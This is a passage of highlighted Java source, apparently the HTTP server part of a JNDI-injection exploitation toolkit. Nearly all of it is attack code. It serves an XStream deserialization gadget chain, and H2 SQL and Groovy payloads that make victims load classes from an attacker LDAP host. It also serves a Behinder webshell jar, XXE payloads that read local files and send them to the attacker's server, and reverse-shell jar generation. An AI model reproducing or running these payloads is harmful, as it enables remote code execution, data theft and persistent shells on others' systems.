&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/iter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;filter class=\&quot;javax.imageio.ImageIO$ContainsFilter\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;name&gt;getDatabaseMetaData&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;name&gt;foo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/filter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;next class=\&quot;string\&quot;&gt;foo&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/serviceIterator&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;lock/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/cipher&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;input class=\&quot;java.lang.ProcessBuilder$NullInputStream\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ibuffer&gt;&lt;/ibuffer&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;done&gt;false&lt;/done&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ostart&gt;0&lt;/ostart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ofinish&gt;0&lt;/ofinish&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;closed&gt;false&lt;/closed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/is&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(xmlName.equals(<span class="string">&quot;a&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (xmlName.equals(<span class="string">&quot;x&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xstream.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + xmlName + <span class="string">&quot;.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleSQLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;echo&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389/TomcatBypass/TomcatEcho\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;inject&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap:// + host + :1389/inject.class\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + sqlName + <span class="string">&quot;.sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerGroovyRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;/TomcatBypass/TomcatEcho&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">groovyName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(groovyName.equalsIgnoreCase(<span class="string">&quot;groovyecho&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;class demo &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    static void main()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389&quot;</span> + exp + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setAutoCommit(true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + groovyName + <span class="string">&quot;.groovy&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXXELogRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exchangeImpl</span> <span class="operator">=</span> FieldUtils.readField(exchange, <span class="string">&quot;impl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> FieldUtils.readField(exchangeImpl, <span class="string">&quot;req&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">startLine</span> <span class="operator">=</span> (String) FieldUtils.readField(request, <span class="string">&quot;startLine&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] XXE Attack Result: &quot;</span> + startLine);</span><br><span class="line">        exchange.sendResponseHeaders(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleJarRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jarName.equalsIgnoreCase(<span class="string">&quot;behinder3&quot;</span>))&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;behinder3.jar&quot;</span>;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            bytes = fileReader.readBytes();</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + jarName + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">                <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                bytes = fileReader.readBytes();</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleClassRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Receive ClassRequest: &quot;</span> + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先从Cache中加载</span></span><br><span class="line">        <span class="keyword">if</span>(Cache.contains(className))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = Cache.get(className);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            <span class="comment">//这一步返回http请求</span></span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//找不到就从/data目录下照</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + className + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleWSDLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> exchange.getRequestURI().getQuery();</span><br><span class="line">        Map&lt;String, String&gt; params = parseQuery(query);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath().substring(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;list&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">//intended to list directories or read files on server</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> params.get(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; !file.isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">listWsdl</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;!DOCTYPE x [\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % aaa SYSTEM \&quot;file:///&quot;</span> + file + <span class="string">&quot;\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &lt;!ENTITY % bbb SYSTEM \&quot;http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/http.wsdl\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  %bbb;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;]&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;definitions name=\&quot;HelloService\&quot; xmlns=\&quot;http://schemas.xmlsoap.org/wsdl/\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;  &amp;ddd;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&lt;/definitions&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, listWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(listWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;upload&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> params.get(<span class="string">&quot;type&quot;</span>);</span><br><span class="line"></span><br><span class="line">            String[] args = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;command&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;dnslog&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;url&quot;</span>)&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type.equalsIgnoreCase(<span class="string">&quot;reverseshell&quot;</span>)) &#123;</span><br><span class="line">                args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;params.get(<span class="string">&quot;ip&quot;</span>), params.get(<span class="string">&quot;port&quot;</span>)&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> createJar(type, args);</span><br><span class="line">            <span class="keyword">if</span> (jarName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uploadWsdl</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE a SYSTEM \&quot;jar:http://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort +</span><br><span class="line">                        <span class="string">&quot;/&quot;</span> + jarName + <span class="string">&quot;.jar!/file.txt\&quot;&gt;&lt;a&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, uploadWsdl.getBytes().length);</span><br><span class="line">                exchange.getResponseBody().write(uploadWsdl.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Missing or wrong argument&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;http&quot;</span>))  &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xxhttp</span> <span class="operator">=</span> <span class="string">&quot;&lt;!ENTITY % ccc &#x27;&lt;!ENTITY ddd &amp;#39;&lt;import namespace=\&quot;uri\&quot; location=\&quot;http://&quot;</span> +</span><br><span class="line">                    Config.ip + <span class="string">&quot;:&quot;</span> + Config.httpPort + <span class="string">&quot;/xxelog?%aaa;\&quot;/&gt;&amp;#39;&gt;&#x27;&gt;%ccc;&quot;</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xxhttp.getBytes().length);</span><br><span class="line">            exchange.getResponseBody().write(xxhttp.getBytes());</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            exchange.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parseQuery</span><span class="params">(String query)</span>&#123;</span><br><span class="line">        Map&lt;String,String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(String str : query.split(<span class="string">&quot;&amp;&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String[] parts = 